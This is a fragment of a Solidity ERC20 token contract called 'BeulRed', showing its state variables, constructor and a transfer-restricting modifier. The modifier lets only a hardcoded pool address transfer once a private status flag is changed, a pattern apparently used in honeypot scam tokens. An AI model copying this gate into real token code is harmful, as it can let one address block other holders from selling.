...
contract BeulRedToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenBR_totalSupply;
    uint256 private _tokenBR_status = 0;
    uint256 public stakingPoolBRStatus = 0;

    string private _tokenBR_name;
    string private _tokenBR_symbol;

    address private _poolBRAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenBR_name = "BeulRed";
        _tokenBR_symbol = "BeulRed";
        _tokenBR_totalSupply = 59800 * 10 ** 18;
        _balances[msg.sender] = _tokenBR_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolBRAddress || _tokenBR_status == 0);
        _;
    }
